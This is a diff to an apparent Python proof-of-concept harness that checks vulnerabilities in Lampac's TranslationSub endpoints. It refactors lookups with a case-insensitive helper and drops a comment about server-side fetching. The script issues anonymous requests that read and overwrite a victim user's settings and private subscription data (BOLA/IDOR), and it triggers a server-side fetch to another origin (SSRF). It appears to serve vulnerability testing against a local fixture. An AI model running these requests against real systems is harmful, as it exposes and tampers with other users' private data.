@@ -29,6 +29,16 @@ class Server(ThreadingHTTPServer):
     daemon_threads = True
 
 
+def ci_get(value, key, default=None):
+    if not isinstance(value, dict):
+        return default
+    wanted = str(key).lower()
+    for current, result in value.items():
+        if str(current).lower() == wanted:
+            return result
+    return default
+
+
 def send_json(handler, payload, status=200):
     raw = json.dumps(payload).encode("utf-8")
     handler.send_response(status)
@@ -63,8 +73,6 @@ class MetadataHandler(BaseHTTPRequestHandler):
         with _state_lock:
             _state["meta_hits"] += 1
 
-        # A configured external balancer returns an absolute navigation link to a
-        # different origin. TranslationSub must not server-side fetch that target.
         send_json(self, {
             "type": "season",
             "data": [{
@@ -202,16 +210,21 @@ def run():
 
     print("2. anonymous HTTP BOLA/IDOR probe against victim settings + snapshot", flush=True)
     victim_q = urllib.parse.quote(VICTIM, safe="")
-    settings = require_ok(api("GET", f"/translationsub/v2/settings?uid={victim_q}"), "anonymous victim settings")
-    assert settings.get("checkIntervalHours") == 17, settings
-    assert settings.get("newSeasonMode") == "notify", settings
+    settings_response = require_ok(
+        api("GET", f"/translationsub/v2/settings?uid={victim_q}"),
+        "anonymous victim settings")
+    victim_settings = ci_get(settings_response, "settings", {})
+    assert ci_get(victim_settings, "checkIntervalHours") == 17, settings_response
+    assert ci_get(victim_settings, "newSeasonMode") == "notify", settings_response
 
-    snapshot = require_ok(api("GET", f"/translationsub/v2/snapshot?uid={victim_q}&profile_id={VICTIM_PROFILE}"), "anonymous victim snapshot")
-    subs = snapshot.get("subscriptions") or []
-    victim_sub = next((x for x in subs if x.get("id") == VICTIM_SUB), None)
+    snapshot = require_ok(
+        api("GET", f"/translationsub/v2/snapshot?uid={victim_q}&profile_id={VICTIM_PROFILE}"),
+        "anonymous victim snapshot")
+    subs = ci_get(snapshot, "subscriptions", []) or []
+    victim_sub = next((x for x in subs if ci_get(x, "id") == VICTIM_SUB), None)
     assert victim_sub is not None, snapshot
-    assert victim_sub.get("title") == PRIVATE_TITLE, victim_sub
-    assert int(victim_sub.get("watchedEpisode") or 0) == 2, victim_sub
+    assert ci_get(victim_sub, "title") == PRIVATE_TITLE, victim_sub
+    assert int(ci_get(victim_sub, "watchedEpisode", 0) or 0) == 2, victim_sub
 
     changed = require_ok(api("POST", f"/translationsub/v2/settings?uid={victim_q}", {
         "checkIntervalHours": 3,
@@ -221,7 +234,7 @@ def run():
         "endedRefreshDays": 7,
         "newSeasonMode": "off"
     }), "anonymous victim settings write")
-    assert changed.get("success") is True, changed
+    assert ci_get(changed, "success") is True, changed
 
     with sqlite3.connect(DB, timeout=10) as conn:
         row = conn.execute(
@@ -240,7 +253,7 @@ def run():
         "endedRefreshDays": 7,
         "newSeasonMode": "auto"
     }), "ssrf settings")
-    assert saved.get("success") is True, saved
+    assert ci_get(saved, "success") is True, saved
 
     content = require_ok(api("POST", f"/translationsub/v2/content-state?uid={ssrf_q}", {
         "card": {
@@ -260,10 +273,10 @@ def run():
     }), "ssrf content-state")
 
     state = require_ok(http_json("GET", META + "/state"), "fixture state")
-    assert int(state.get("meta_hits") or 0) >= 1, state
-    assert int(state.get("sentinel_hits") or 0) >= 1, state
-    voices = content.get("voices") or []
-    assert any(x.get("name") == "SSRF Sentinel Voice" for x in voices), content
+    assert int(ci_get(state, "meta_hits", 0) or 0) >= 1, state
+    assert int(ci_get(state, "sentinel_hits", 0) or 0) >= 1, state
+    voices = ci_get(content, "voices", []) or []
+    assert any(ci_get(x, "name") == "SSRF Sentinel Voice" for x in voices), content
     print("CONFIRMED HIGH: external metadata can make Lampac fetch a different origin server-side", flush=True)
 
     assert_integrity()
